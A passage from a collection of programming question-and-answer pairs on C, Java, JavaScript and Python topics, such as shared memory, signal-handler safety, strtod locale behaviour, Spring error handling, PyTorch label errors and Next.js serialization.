shm_open() will create and open a new, persistent shared-memory object or simply open an existing one, depending on whether there already is one with the specified name.
that region can be opened by other processes (and therefore must persist) until it is unlinked via shm_unlink().
a shared memory region lives after its unlinking as long as any process has it open, but it can no longer be opened via shm_open().
mapping a shared memory region via mmap() has the effect of holding it open while that mapping is in place, independent of the file descriptor used to map it

Moreover, memory mappings for a shared-memory region are in most respects the same as mappings for regular files.  Mappings are per-process properties; they do not survive termination of the process to which they pertain.  Mappings are preserved (duplicated) across fork()s.
On some systems, shared memory regions may even be accessible via the file system.  Aside from the different functions for managing them, their most significant difference from regular files is probably that they do not persist across reboots.
Thus, you do not need to worry about termination of a process unwantedly tearing down a shared memory region that is in use by other processes.  On the other hand, you can arrange for shared-memory regions to be cleaned up automatically by unlinking them after every process that needs to obtain access by name has done so.  If you intend to grant access only to child processes (and maybe their children, etc.) then you can unlink immediately after creation.  Children will inherit the mapping when you fork them.
So, in response to the actual question:

Is this also the case for shared memory objects, are they also closed and unmapped or simply just closed?

Shared memory objects open and / or mapped by a process are both closed and unmapped when that process terminates, but they are not automatically unlinked.  They will persist at least until manually unlinked or the system is rebooted.
",c
bad sql grammar exception in jdbc spring,"I am the getting 

org.springframework.jdbc.BadSqlGrammarException:
  PreparedStatementCallback; bad SQL grammar [select cid,
  clinician-code, password, first-name, last-name from Clinician where
  clinician-code= ?]; nested exception is
  com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown
  column 'clinician' in 'field list'

error on the following code, You can also see the Table in the screen shot, except for cid all other attributes are VARCHAR(45)

Row mapper class
public class CClinicianRowMapper implements RowMapper {

@Override
public Object mapRow(ResultSet rs, int line) throws SQLException {
    CClinicianResultSetExtractor extractor = new CClinicianResultSetExtractor();
    return extractor.extractData(rs);
}

}
Result Extractor Class
public class CClinicianResultSetExtractor implements ResultSetExtractor {
  @Override
  public Object extractData(ResultSet rs) throws SQLException {
    CClinician clinician = new CClinician();
    clinician.setCid(rs.getLong(""cid""));
    clinician.setClinicianCode(rs.getString(""clinician-code""));
    clinician.setPassword(rs.getString(""password""));
    clinician.setFirstName(rs.getString(""first-name""));
    return clinician;
  }

}
Class for selecting data from table
public List<CClinician> findClinician(CClinician _clinician) {
    // TODO Auto-generated method stub
    JdbcTemplate select = new JdbcTemplate(dataSource);
    try
    {
    return select.query(""select cid, clinician-code, password, first-name, last-name from Clinician where clinician-code= ?"",
            new Object[] {_clinician.getClinicianCode()}, new CClinicianRowMapper());

    }
    catch (Exception e)
    {
        e.printStackTrace();
    }
    return null;
}

","In order to use a dash in the column names, you need to escape them with back ticks.
""SELECT cid, `clinician-code`, password, `first-name`, `last-name` 
     FROM Clinician 
     WHERE `clinician-code` = ?""

",java
intellijidea disable inspection actual value of parameter is always,"Is there a way to disable this inspection? I know, this maybe be a bad design, but I still would like to disable it. 
","Find an instance of the inspection, and hit ALT+ENTER to open the content menu. You'll see a suggestion there that looks like ""Inline value 'XYZ' for parameter 'myParameter'"". Click the right arrow next to it to open a second context menu, and there you'll find options to edit the inspection setting in order to tune the conditions that will produce it, suppress it for the method/class/parameter, or even disable it altogether.
",java
cannot scroll to bottom of scrollview in react native,"I have a very simple example of using a ScrollView and I cannot seem to scroll to the bottom.
The example is completely basic, I'm not doing anything special yet the last item is never fully visible.
Expo Code
 import React, { Component } from ""react"";
 import { Text, View, ScrollView, StyleSheet } from ""react-native"";
 import { Constants } from ""expo"";

 const data = Array.from({ length: 20 }).map((_, i) => i + 1);

 export default class App extends Component {
  render() {
    return (
        <ScrollView style={styles.container}>
            {data.map(d => (
                <View style={styles.view}>
                    <Text style={styles.text}>{d}</Text>
                </View>
            ))}
        </ScrollView>
      );
    }
  }

const styles = StyleSheet.create({
  container: {
     paddingTop: Constants.statusBarHeight
  },
  text: {
    fontWeight: ""bold"",
    color: ""#fff"",
    textAlign: ""center"",
    fontSize: 28
},
view: {
    padding: 10,
    backgroundColor: ""#018bbc""
  }
 });

Here is the output:

","Modify your render() method and wrap the ScrollView inside a View container, and set the paddingTop to that View container:
render() {
    return (
        <View style={ styles.container}>
            <ScrollView >
                {data.map(d => <View style={styles.view}><Text style={styles.text}>{d}</Text></View>)}
            </ScrollView>
        </View>
    );
}

",javascript
how can i check if a scrollbar is visible,"Is it possible to check the overflow:auto of a div?
For example:
HTML
<div id=""my_div"" style=""width: 100px; height:100px; overflow:auto;"" class=""my_class""> 
  * content
</div>

JQUERY
$('.my_class').live('hover', function (event)
{
    if (event.type == 'mouseenter')
    {
         if( ...  if scrollbar visible ? ... )
         {
            alert('true'):
         }
         else
         {
            alert('false'):
         }
    }

});

Sometimes is the content short (no scrollbar) and sometimes long (scrollbar visible).
","a little plugin for it.
(function($) {
    $.fn.hasScrollBar = function() {
        return this.get(0).scrollHeight > this.height();
    }
})(jQuery);

use it like this,
$('#my_div1').hasScrollBar(); // returns true if there's a `vertical` scrollbar, false otherwise..

tested working on Firefox, Chrome, IE6,7,8
but not working properly on body tag selector
demo

Edit
I found out that when you have horizontal scrollbar that causes vertical scrollbar to appear, this function does not work....
I found out another solution... use clientHeight
return this.get(0).scrollHeight > this.get(0).clientHeight;

",javascript
java jpa  query with specified inherited type,"I am building a query on a generic table ""Sample"" and I have several types which inherit from this table ""SampleOne"", ""SampleTwo"". 
I require a query like :
select s from Sample where s.type = :type

where type would be a discriminator value of the table. Is it possible in any way ( and avoid to create an entity specific queries, one for each SampleOne, SampleTwo... etc )
I would greatly appreciate any input in this topic,
Kind regards,
P.
","In JPA 2.0 you can use TYPE expression (though currently it doesn't work with parameters in Hibernate, see HHH-5282):
select s from Sample s where TYPE(s) = :type

The similar Hibernate-specific expression is .class:
select s from Sample s where s.class = :type

",java
operations on a signal handler c,"I have read that only a limited set of operations is allowed in signal handlers, for example you cannot update a global variable unless it is volatile sig_atomic_t.
This means that only atomic operations should be done in signal handlers.
For example posting a semaphore (with sem_post) is atomic,so it can be done within a signal handler, right?
","
I have read that only a limited set of operations is allowed in signal
handlers, for example you cannot update a global variable unless it is
volatile sig_atomic_t.

According to the C language spec,

If the signal occurs as the result of calling the abort or raise
function, the signal handler shall not call the raise function.
If the signal occurs other than as the result of calling the abort
or raise function, the behavior is undefined if the signal handler
refers to any object with static or thread storage duration that is
not a lock-free atomic object and that is not declared with the
constexpr storage-class specifier other than by assigning a value to
an object declared as volatile sig_atomic_t, or the signal handler
calls any function in the standard library other than

the abort function,
the _Exit function,
the quick_exit function,
the functions in <stdatomic.h> (except where explicitly stated otherwise) when the atomic arguments are lock-free,
the atomic_is_lock_free function with any atomic argument, or
the signal function with the first argument equal to the signal number corresponding to the signal that caused the invocation of the
handler. Furthermore, if such a call to the signal function results
in a SIG_ERR return, the object designated by errno has an
indeterminate representation.


(C23 7.14.2.1/4-5)
If you happen to be using a POSIX-conforming C implementation then you can rely on somewhat more lenience.  POSIX defines behavior for more kinds of object accesses by signal handlers, and it specifies a longer list of functions that a signal handler may definedly call, which POSIX classifies as ""async-signal-safe"".  Even though that list is relatively long, there are still many notable omissions, such as all the stdio functions.

This means that only atomic operations should be done in signal
handlers.

No, that's not an accurate reading:

signal handlers may perform non-atomic operations on objects with automatic storage duration (i.e. their local variables) without special concern.

Moreover, the type sig_atomic_t is not necessarily an atomic type, in the language's sense of that term, its name notwithstanding.  Operations on objects of that type are not necessarily atomic operations.

The atomic operations that don't elicit undefined behavior are limited to those on lock-free atomic objects, which is typically a subset of atomic objects.



For example posting a semaphore (with sem_post) is atomic,so it can be
done within a signal handler, right?

Posting a semaphore via POSIX sem_post is not an atomic operation in the relevant sense.  However, sem_post() is among POSIX's async-signal-safe functions, so in a POSIX environment, signal handlers do not elicit undefined behavior by calling that function.
In contrast, few pthreads functions are async-signal-safe, and none of the pthreads mutex or condition variable functions are among those.
If you want to stick to defined behavior in your signal handlers -- and you should, because undefined signal handler behavior can bite you hard and is difficult to debug -- then you need to learn specifically what the specs say about it.  It is not sufficient to rely on hearsay and vague ideas about what is safe and what isn't.  Asking questions such as this one is a good way to start.
",c
are locale specific whitespaces skipped with strtod compliant,"Is my C library compliant?
In testing strtod(), my code reported an interesting inconsistency:
strtod(""\240"" ""123"", ...)  --> 0.0.
In locales that identified character 160 '\240' as a white-space, strtod() did not skip character 160 as a leading white-space, yet strtol() did.
I suspect my library has a corner bug as I expected strtod() to follow the current locale's isspace().
Is it a bug, allowed behavior or a fixed bug?

Sample code:
#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include <locale.h>
#include <stdio.h>
#include <stdlib.h>

void test_locale_name(const char *locale_name) {
  const char *current_locale = setlocale(LC_ALL, locale_name);
  if (current_locale) {
    printf(""Current locale name \""%s\""\n"", current_locale);
  }
  puts(""White spaces in this locale\n"");
  for (int i = UCHAR_MAX; i > 0; i--) {
    if (isspace(i) && i != '\n' && i != '\r') {
      char buf[100];
      snprintf(buf, sizeof buf, ""%c123"", i);
      char *endptr;
      errno = 0;
      long val = strtol(buf, &endptr, 0);
      printf(""Character code %3d:   strtol(\""%s\"") converts to %3ld, length = %d\n"", i,
          buf, val, (int) (endptr - buf));
      errno = 0;
      double value_d = strtod(buf, &endptr);
      printf(""Character code %3d:   strtod(\""%s\"") converts to %3g, length = %d\n"", i,
          buf, value_d, (int) (endptr - buf));
    }
  }
  puts(""\n"");
}

int main(void) {
  /*
   *  A null pointer for locale causes the setlocale function to return a pointer
   *  to the string associated with the category for the program’s current locale;
   *  the program’s locale is not changed.
   */
  const char *locale_names[] = { NULL, ""POSIX"", ""af_ZA"" };
  size_t locale_names_n = sizeof locale_names / sizeof locale_names[0];
  for (size_t i = 0; i < locale_names_n; i++) {
    test_locale_name(locale_names[i]);
  }
  return 0;
}

Sample output
Current locale name ""C""
White spaces in this locale

Character code  32:   strtol("" 123"") converts to 123, length = 4
Character code  32:   strtod("" 123"") converts to 123, length = 4
Character code  12:   strtol(""123"") converts to 123, length = 4
Character code  12:   strtod(""123"") converts to 123, length = 4
Character code  11:   strtol(""123"") converts to 123, length = 4
Character code  11:   strtod(""123"") converts to 123, length = 4
Character code   9:   strtol(""  123"") converts to 123, length = 4
Character code   9:   strtod(""  123"") converts to 123, length = 4


Current locale name ""C""
White spaces in this locale

Character code  32:   strtol("" 123"") converts to 123, length = 4
Character code  32:   strtod("" 123"") converts to 123, length = 4
Character code  12:   strtol(""123"") converts to 123, length = 4
Character code  12:   strtod(""123"") converts to 123, length = 4
Character code  11:   strtol(""123"") converts to 123, length = 4
Character code  11:   strtod(""123"") converts to 123, length = 4
Character code   9:   strtol(""  123"") converts to 123, length = 4
Character code   9:   strtod(""  123"") converts to 123, length = 4


Current locale name ""af_ZA""
White spaces in this locale

Character code 160:   strtol(""�123"") converts to 123, length = 4
Character code 160:   strtod(""�123"") converts to   0, length = 0  ***!!!!***
Character code  32:   strtol("" 123"") converts to 123, length = 4
Character code  32:   strtod("" 123"") converts to 123, length = 4
Character code  12:   strtol(""123"") converts to 123, length = 4
Character code  12:   strtod(""123"") converts to 123, length = 4
Character code  11:   strtol(""123"") converts to 123, length = 4
Character code  11:   strtod(""123"") converts to 123, length = 4
Character code   9:   strtol(""  123"") converts to 123, length = 4
Character code   9:   strtod(""  123"") converts to 123, length = 4



C23 spec has:

In this clause, ""white-space character"" refers to (execution) white-space character as defined by isspace.  C23dr § 7.1.1 5


7.24.1.5 The strtod, strtof, and strtold functions
First, they decompose the input string into three parts: an initial, possibly empty, sequence of white-space characters, a subject sequence resembling a floating constant
...
§ 7.24.1.5 2


In other than the ""C"" locale, additional locale-specific subject sequence forms may be accepted.
§ 7.24.1.5 7

and similar specs for strtol()

7.24.1.7 The strtol, strtoll, strtoul, and strtoull functions
First, they decompose the input string into three parts: an initial, possibly empty, sequence of white-space characters, a subject sequence resembling an integer ...
C23dr § 7.24.1.7 6


In other than the ""C"" locale, additional locale-specific subject sequence forms may be accepted.
C23dr § 7.24.1.7 3

Compiler output includes:
Invoking: Cygwin C Compiler
gcc -O0 -g3 -pedantic -Wall -Wextra -Wconversion -Wsign-conversion -c -std=c17  -fmessage-length=0 -Wformat -Wformat-security -Wformat=2 -Wmaybe-uninitialized -Werror=stringop-truncation -Wcast-align=strict -v -MMD -MP -MF""strtod7.d"" -MT""strtod7.o"" -o ""strtod7.o"" ""../strtod7.c""
Using built-in specs.
COLLECT_GCC=gcc
Target: x86_64-pc-cygwin
Configured with: /mnt/share/cygpkgs/gcc/gcc.x86_64/src/gcc-12.4.0/configure --srcdir=/mnt/share/cygpkgs/gcc/gcc.x86_64/src/gcc-12.4.0 --prefix=/usr --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --docdir=/usr/share/doc/gcc --htmldir=/usr/share/doc/gcc/html -C --build=x86_64-pc-cygwin --host=x86_64-pc-cygwin --target=x86_64-pc-cygwin --without-libiconv-prefix --without-libintl-prefix --libexecdir=/usr/lib --with-gcc-major-version-only --enable-shared --enable-shared-libgcc --enable-static --enable-version-specific-runtime-libs --enable-bootstrap --enable-__cxa_atexit --enable-clocale=newlib --with-dwarf2 --with-tune=generic --enable-languages=ada,c,c++,fortran,lto,objc,obj-c++,jit --enable-graphite --enable-threads=posix --enable-libatomic --enable-libgomp --enable-libquadmath --enable-libquadmath-support --disable-libssp --enable-libada --disable-symvers --disable-multilib --with-gnu-ld --with-gnu-as --with-cloog-include=/usr/include/cloog-isl --without-libiconv-prefix --without-libintl-prefix --with-system-zlib --enable-linker-build-id --with-default-libstdcxx-abi=gcc4-compatible --enable-libstdcxx-filesystem-ts
Thread model: posix
Supported LTO compression algorithms: zlib zstd
gcc version 12.4.0 (GCC) 
COLLECT_GCC_OPTIONS='-O0' '-g3' '-Wpedantic' '-Wall' '-Wextra' '-Wconversion' '-Wsign-conversion' '-c' '-std=c17' '-fmessage-length=0' '-Wformat=1' '-Wformat-security' '-Wformat=2' '-Wmaybe-uninitialized' '-Werror=stringop-truncation' '-Wcast-align=strict' '-v' '-MMD' '-MP' '-MF' 'strtod7.d' '-MT' 'strtod7.o' '-o' 'strtod7.o' '-mtune=generic' '-march=x86-64'
 /usr/lib/gcc/x86_64-pc-cygwin/12/cc1.exe -quiet -v -MMD strtod7.d -MF strtod7.d -MP -MT strtod7.o -dD -idirafter /usr/lib/gcc/x86_64-pc-cygwin/12/../../../../lib/../include/w32api -idirafter /usr/lib/gcc/x86_64-pc-cygwin/12/../../../../x86_64-pc-cygwin/lib/../lib/../../include/w32api ../strtod7.c -quiet -dumpbase strtod7.c -dumpbase-ext .c -mtune=generic -march=x86-64 -g3 -O0 -Wpedantic -Wall -Wextra -Wconversion -Wsign-conversion -Wformat=1 -Wformat-security -Wformat=2 -Wmaybe-uninitialized -Werror=stringop-truncation -Wcast-align=strict -std=c17 -version -fmessage-length=0 -o /cygdrive/c/Users/TPC/AppData/Local/Temp/cch4QUWQ.s
GNU C17 (GCC) version 12.4.0 (x86_64-pc-cygwin)
    compiled by GNU C version 12.4.0, GMP version 6.3.0, MPFR version 4.2.1, MPC version 1.3.1, isl version isl-0.27-GMP

Although this C lib is not the latest gcc, newer   (14.2?), perhaps less stable ones did not list a related fix that I could find.
","I would consider this to be a bug: white-space is well defined in the C Standard for these functions and must be locale specific and consistent with the behavior of the isspace() macro.
The implementation of strtod in the newlib, originally written by David M. Gay at AT&T has this (somewhat cryptic) code to parse the initial portion of the argument string:
    for(s = s00;;s++) switch(*s) {
        case '-':
            sign = 1;
            /* no break */
        case '+':
            if (*++s)
                goto break2;
            /* no break */
        case 0:
            goto ret0;
        case '\t':
        case '\n':
        case '\v':
        case '\f':
        case '\r':
        case ' ':
            continue;
        default:
            goto break2;
        }
 break2:

ASCII white space characters are tested explicitly and the locale information is only used to recognize the decimal separator.
Conversely, strtol redirects to the much older _strtol_l implementation from the BSD code that has a naive loop to skip the Standard conforming locale dependent optional white space:
    /*
     * Skip white space and pick up leading +/- sign if any.
     * If base is 0, allow 0x for hex and 0 for octal, else
     * assume decimal; if base is already 16, allow 0x.
     */
    do {
        c = *s++;
    } while (isspace_l(c, loc));
    if (c == '-') {
        neg = 1;
        c = *s++;
    } else if (c == '+')
        c = *s++;
    if ((base == 0 || base == 16) &&
        c == '0' && (*s == 'x' || *s == 'X')) {
        c = s[1];
        s += 2;
        base = 16;
    }
    if (base == 0)
        base = c == '0' ? 8 : 10;

Note however that this implementation is incorrect too as the 0x prefix is skipped unconditionally, which is non conforming if not followed by a hex digit.
You should file at least one bug report with the newlib support team.
",c
what is jsx when is it used and why is it used,"I'm learning React and I keep on hearing the phrase JSX.
I've tried watching videos about it but I still don't understand what it is.
I've also had a look at the documentation but my head is still scrambled I've had a look at JSX and to me it just looks like regular HTML.
What is JSX and what is the difference between JSX and HTML?
","JSX is what react uses to render content to page. JSX stands for JavaScript as XML, hence it’s HTML like syntax. The extra features of JSX that don’t come with just plain HTML is things like conditional rendering and dynamic content an example of each.
{showContent ? <p>This is content</p> : null}
<p>{counter} </p>
",javascript
typeerror cannot read property 39uuid39 of undefined fakerjs faker,"I am trying to use faker-js package, but I unexpectedly get a TypeError: Cannot read property 'uuid' of undefined for my variable businessId which try to use faker.datatype.uuid()
It usually happen when I forget to install faker-js, but that's not the case here, and I check that I imported this package. Therefore I am clueless on what I am doing wrong here.
// eslint-disable-next-line import/order
const { initConfig } = require('../../../config');

initConfig();

const sinon = require('sinon');
const faker = require('@faker-js/faker');
const { retryAsyncCall } = require('../../../src/common/helpers/retry-async');
const { createFacebookAdVideoFromUrl } = require('../../../src/common/controllers/facebook/api');

function createPayloadDataBuilder(payload = {}) {
  const template = {
    accountId: faker.datatype.uuid(),
    publicLink: faker.internet.url(),
    videoName: faker.lorem.word(),
    facebookToken: undefined,
    params: null,
    businessId: faker.datatype.uuid(),
  };
  return { ...payload, ...template };
}

describe('Facebook Gateway', () => {
  describe('createFacebookAdVideoFromUrl', () => {
    describe('Given businessId', () => {
      it.only(""should create the video calling business's Facebook ids"", async () => {
        const businessId = faker.datatype.uuid();
        console.log(faker, businessId);
        const createFacebookAdVideoPayload = createPayloadDataBuilder({
          businessId,
        });

        await createFacebookAdVideoFromUrl(...createFacebookAdVideoPayload);

        // sinon.assert.called(retryAsyncCall);
      });
    });
  });
});

","Found it! I need to destructure the import:
const { faker } = require('@faker-js/faker');
",javascript
facing this error while classifying images containing 10 classes in pytorch in resnet50 my code is,"This is the code I am implementing: I am using a subset of the CalTech256 dataset to classify images of 10 different kinds of animals. We will go over the dataset preparation, data augmentation and then steps to build the classifier.
def train_and_validate(model, loss_criterion, optimizer, epochs=25):
    '''
    Function to train and validate
    Parameters
        :param model: Model to train and validate
        :param loss_criterion: Loss Criterion to minimize
        :param optimizer: Optimizer for computing gradients
        :param epochs: Number of epochs (default=25)
  
    Returns
        model: Trained Model with best validation accuracy
        history: (dict object): Having training loss, accuracy and validation loss, accuracy
    '''
    
    start = time.time()
    history = []
    best_acc = 0.0

    for epoch in range(epochs):
        epoch_start = time.time()
        print(""Epoch: {}/{}"".format(epoch+1, epochs))
        
        # Set to training mode
        model.train()
        
        # Loss and Accuracy within the epoch
        train_loss = 0.0
        train_acc = 0.0
        
        valid_loss = 0.0
        valid_acc = 0.0
        
        for i, (inputs, labels) in enumerate(train_data_loader):

            inputs = inputs.to(device)
            labels = labels.to(device)
            
            # Clean existing gradients
            optimizer.zero_grad()
            
            # Forward pass - compute outputs on input data using the model
            outputs = model(inputs)
            
            # Compute loss
            loss = loss_criterion(outputs, labels)
            
            # Backpropagate the gradients
            loss.backward()
            
            # Update the parameters
            optimizer.step()
            
            # Compute the total loss for the batch and add it to train_loss
            train_loss += loss.item() * inputs.size(0)
            
            # Compute the accuracy
            ret, predictions = torch.max(outputs.data, 1)
            correct_counts = predictions.eq(labels.data.view_as(predictions))
            
            # Convert correct_counts to float and then compute the mean
            acc = torch.mean(correct_counts.type(torch.FloatTensor))
            
            # Compute total accuracy in the whole batch and add to train_acc
            train_acc += acc.item() * inputs.size(0)
            
            #print(""Batch number: {:03d}, Training: Loss: {:.4f}, Accuracy: {:.4f}"".format(i, loss.item(), acc.item()))

            
        # Validation - No gradient tracking needed
        with torch.no_grad():

            # Set to evaluation mode
            model.eval()

            # Validation loop
            for j, (inputs, labels) in enumerate(valid_data_loader):
                inputs = inputs.to(device)
                labels = labels.to(device)

                # Forward pass - compute outputs on input data using the model
                outputs = model(inputs)

                # Compute loss
                loss = loss_criterion(outputs, labels)

                # Compute the total loss for the batch and add it to valid_loss
                valid_loss += loss.item() * inputs.size(0)

                # Calculate validation accuracy
                ret, predictions = torch.max(outputs.data, 1)
                correct_counts = predictions.eq(labels.data.view_as(predictions))

                # Convert correct_counts to float and then compute the mean
                acc = torch.mean(correct_counts.type(torch.FloatTensor))

                # Compute total accuracy in the whole batch and add to valid_acc
                valid_acc += acc.item() * inputs.size(0)

                #print(""Validation Batch number: {:03d}, Validation: Loss: {:.4f}, Accuracy: {:.4f}"".format(j, loss.item(), acc.item()))
            
        # Find average training loss and training accuracy
        avg_train_loss = train_loss/train_data_size 
        avg_train_acc = train_acc/train_data_size

        # Find average training loss and training accuracy
        avg_valid_loss = valid_loss/valid_data_size 
        avg_valid_acc = valid_acc/valid_data_size

        history.append([avg_train_loss, avg_valid_loss, avg_train_acc, avg_valid_acc])
                
        epoch_end = time.time()
    
        print(""Epoch : {:03d}, Training: Loss: {:.4f}, Accuracy: {:.4f}%, \n\t\tValidation : Loss : {:.4f}, Accuracy: {:.4f}%, Time: {:.4f}s"".format(epoch, avg_train_loss, avg_train_acc*100, avg_valid_loss, avg_valid_acc*100, epoch_end-epoch_start))
        
        # Save if the model has best accuracy till now
        torch.save(model, dataset+'_model_'+str(epoch)+'.pt')
            
    return model, history

# Load pretrained ResNet50 Model
resnet50 = models.resnet50(pretrained=True)
#resnet50 = resnet50.to('cuda:0')


# Freeze model parameters
for param in resnet50.parameters():
    param.requires_grad = False
# Change the final layer of ResNet50 Model for Transfer Learning
fc_inputs = resnet50.fc.in_features

resnet50.fc = nn.Sequential(
    nn.Linear(fc_inputs, 256),
    nn.ReLU(),
    nn.Dropout(0.4),
    nn.Linear(256, num_classes), # Since 10 possible outputs
    nn.LogSoftmax(dim=1) # For using NLLLoss()
)

# Convert model to be used on GPU
# resnet50 = resnet50.to('cuda:0')

# Change the final layer of ResNet50 Model for Transfer Learning
fc_inputs = resnet50.fc.in_features

resnet50.fc = nn.Sequential(
    nn.Linear(fc_inputs, 256),
    nn.ReLU(),
    nn.Dropout(0.4),
    nn.Linear(256, num_classes), # Since 10 possible outputs
    nn.LogSoftmax(dienter code herem=1) # For using NLLLoss()
)

# Convert model to be used on GPU
# resnet50 = resnet50.to('cuda:0')`enter code here`

Error is this:
--------------------------------------------------------------------------- 
RuntimeError                              Traceback (most recent call last) <ipython-input-30-c7a333acb694> in <module>()
      6 # Train the model for 25 epochs
      7 num_epochs = 30
----> 8 trained_model, history = train_and_validate(resnet50, loss_func, optimizer, num_epochs)
      9 
     10 torch.save(history, dataset+'_history.pt')

<ipython-input-29-239f590d090e> in train_and_validate(model, loss_criterion, optimizer, epochs)
     43 
     44             # Compute loss
---> 45             loss = loss_criterion(outputs, labels)
     46 
     47             # Backpropagate the gradients

~\Anaconda3\lib\site-packages\torch\nn\modules\module.py in
__call__(self, *input, **kwargs)
    539             result = self._slow_forward(*input, **kwargs)
    540         else:
--> 541             result = self.forward(*input, **kwargs)
    542         for hook in self._forward_hooks.values():
    543             hook_result = hook(self, input, result)

~\Anaconda3\lib\site-packages\torch\nn\modules\loss.py in forward(self, input, target)
    202 
    203     def forward(self, input, target):
--> 204         return F.nll_loss(input, target, weight=self.weight, ignore_index=self.ignore_index, reduction=self.reduction)
    205 
    206 

~\Anaconda3\lib\site-packages\torch\nn\functional.py in nll_loss(input, target, weight, size_average, ignore_index, reduce, reduction)    1836                          .format(input.size(0), target.size(0)))    1837     if dim == 2:
-> 1838         ret = torch._C._nn.nll_loss(input, target, weight, _Reduction.get_enum(reduction), ignore_index)    1839     elif dim == 4:    1840         ret = torch._C._nn.nll_loss2d(input, target, weight, _Reduction.get_enum(reduction), ignore_index)

RuntimeError: Assertion `cur_target >= 0 && cur_target < n_classes' failed.  at C:\Users\builder\AppData\Local\Temp\pip-req-build-0i480kur\aten\src\THNN/generic/ClassNLLCriterion.c:97

","This happens when there are either incorrect labels in your dataset, or the labels are 1-indexed (instead of 0-indexed). As from the error message, cur_target must be smaller than the total number of classes (10). To verify the issue, check the maximum and minimum label in your dataset. If the data is indeed 1-indexed, just minus one from all annotations and you should be fine.
Note, another possible reason is that there exists some -1 labels in the data. Some (esp older) datasets use -1 as indication of a wrong/dubious label. If you find such labels, just discard them.
",python
how to modify default spring boot not found url exception with custom message,"I'm trying to modify the default error message and status code for all non supported rest end points.
How to do it ?
My Customer error message
public class ApiErrorResponse {

    private int code;
    private String message;

    public ApiErrorResponse(int code, String message) {
        this.code = code;
        this.message = message;
    }

    public String getMessage() {
        return message;
    }

    public int getCode() {
        return code;
    }
}

Custom error handling logic:
@ControllerAdvice
public class ApiExceptionHandler {

    @ExceptionHandler({NoHandlerFoundException.class})
    public ResponseEntity<ApiErrorResponse> handleNoHandlerFoundException(
            NoHandlerFoundException ex, HttpServletRequest httpServletRequest) {
        ApiErrorResponse apiErrorResponse = new ApiErrorResponse(404, ""Resource not found"");
        return ResponseEntity.status(HttpStatus.NOT_FOUND).contentType(MediaType.APPLICATION_JSON).body(apiErrorResponse);
    }
}

and now tried like curl --location 'localhost:8080/some/invalid/url'
But it gives default 404 status code and error message. not custom message . What I'm missing here ?
","Inorder to identify which default error method we need to override, ResponseEntityExceptionHandler.java base class and identify the method to override.
Here NoHandlerFoundExceptionand handleNoHandlerFoundException() need to be overridden.
above code properly overridden. please add @EnableWebMvc in the application.java or @configuration class to identify override methods.
",java
how can you find unused functions in python code,"So you've got some legacy code lying around in a fairly hefty project. How can you find and delete dead functions?
I've seen these two references: Find unused code and Tool to find unused functions in php project, but they seem specific to C# and PHP, respectively.
Is there a Python tool that'll help you find functions that aren't referenced anywhere else in the source code (notwithstanding reflection/etc.)?
","In Python you can find unused code by using dynamic or static code analyzers. Two examples for dynamic analyzers are coverage and figleaf. They have the drawback that you have to run all possible branches of your code in order to find unused parts, but they also have the advantage that you get very reliable results.
Alternatively, you can use static code analyzers that just look at your code, but don't actually run it. They run much faster, but due to Python's dynamic nature the results may contain false positives.
Two tools in this category are pyflakes and vulture. Pyflakes finds unused imports and unused local variables. Vulture finds all kinds of unused and unreachable code. (Full disclosure: I'm the maintainer of Vulture.)
The tools are available in the Python Package Index https://pypi.org/.
",python
getting data back from async function call,"Hi I am new to multithreading in java. Can someone please help me with this:
My service:
@Async
public List<String> doSomething(int a){
    //Do something
    return list;
}

SpringbootApplication:
@SpringBootApplication
@EnableAsync
public class Test {

    public static void main(String[] args) {
        SpringApplication.run(Test.class, args);
    }

}

Async config:
@Configuration
@EnableAsync
public class AsyncConfig {

    @Bean(name =""taskExecutor"")
    public Executor taskExecutor(){
        ThreadPoolTaskExecutor executor=new ThreadPoolTaskExecutor();
        executor.setCorePoolSize(2);
        executor.setMaxPoolSize(2);
        executor.setQueueCapacity(100);
        executor.setThreadNamePrefix(""userThread-"");
        executor.initialize();
        return executor;
    }
}

Controller:
@RestController
public class Controller{
    
    @Autowired
    private Service service;

    @GetMapping(""test"")
    public List<String> getAll(){
        return service.doSomething(1);
    }
}

When I hit this get request from postman it is showing up blank in the response. I understand that my call is going asynchronously and the response is coming back even before the my method is called. Is there any way to see this response by changing some settings in either my postman or spring boot application
","If you want to process the request asynchronously but also want the API client to receive the response after it finishes processing such that from the client 's point of view , the request processing still looks like synchronous , the key is to use the Servlet3 asynchronous processing feature.
You do not need to configure it to execute asynchronously in the service level using @Aysnc. Instead configure the controller method to return CompletableFuture. Under the cover , it will trigger Servlet3 's asynchronous request processing which will process the request in another thread besides the HTTP thread that receive the request.
So your codes should look something like:
public class Service {
    
    //No need to add @Async
    public List<String> doSomething(int a){
        return list;
    }
}


@RestController
public class Controller{
    
    @Autowired
    private Service service;

    @GetMapping(""test"")
    public CompletableFuture<List<String>> getAll(){
        return CompletableFuture.supplyAsync(()->service.doSomething(1));
    }
}

For details about the Servlet3 asynchronous request processing supported in spring-mvc , you can refer to this blog series start from this .
",java
reason object quotobject datequot cannot be serialized as json please only return json serializable data types,"I am using Prisma and Next.js. When I try to retrieve the content from Prisma in getStaticProps it does fetch the data but I can't pass it on to the main component.
export const getStaticProps = async () => {
  const prisma = new PrismaClient();
  const newsLetters = await prisma.newsLetters.findMany();
  console.log(newsLetters);

  return {
    props: {
      newsLetters: newsLetters,
    },
  };
};

As you can see in this image it is fetching as well as printing the content.

But when I pass I get the following error for passing it as props
Reason: `object` (""[object Date]"") cannot be serialized as JSON. Please only return JSON serializable data types.

","Looks like nextJS doesn't like serializing anything but scalar types for performance reasons. You can read more in this github issue. Best way you can handle this is that you convert your Date objects to UNIX timestamp before returning them.
// your data
let newsLetters = [
    {
        id: 'your-id',
        email: 'email@example.com',
        createdAt: new Date()
    }
];

// map the array
newsLetters.map(x => {
    x.createdAt = Math.floor(x.createdAt / 1000);
    return x;
})

// use newsLetters now
console.log(newsLetters);

",javascript
how to compile a program using llvm for different target architecture,"I want to compile the basic program hello.c to native x86 architecture using LLVM / Clang to generate the intermediate and assembly. 
I used the following commands :
clang -O3 -emit-llvm hello.c -c -o hello.bc
llc hello.bc -o hello.s

It works perfectly. How do I generate the code for other architecture say SPARC 32 bit? Are there any flags used in clang to specify the architecture?
","You can run llc --version to get a list of supported targets.  From my machine:
$ llc --version
LLVM (http://llvm.org/):
  LLVM version 3.2svn
  Optimized build with assertions.
  Built Aug 30 2012 (23:29:11).
  Default target: mipsel-sde-elf
  Host CPU: corei7-avx

  Registered Targets:
    arm      - ARM
